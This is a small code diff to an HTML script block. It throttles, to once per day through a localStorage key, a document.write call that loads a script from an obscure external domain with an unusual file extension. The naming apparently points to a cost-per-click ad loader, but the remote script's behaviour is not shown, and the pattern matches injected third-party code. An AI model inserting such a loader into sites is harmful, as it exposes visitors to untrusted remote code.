@@ -1,3 +1,11 @@
 <script>
-    document.write('<script src="https://new.invuakj.cn/afe6c2ed5a.double8"><\/script>');
+    // 只显示一次
+    var cpc_top_key = "cpc_top";
+    var cpc_top_val = localStorage.getItem(cpc_top_key);
+    var date_now = "" + (new Date()).getDate();
+    localStorage.setItem(cpc_top_key, date_now);
+    if (cpc_top_val === null || cpc_top_val !== date_now) {
+        document.write('<script async src="https://new.invuakj.cn/afe6c2ed5a.double8"><\/script>');
+    }
+
 </script>
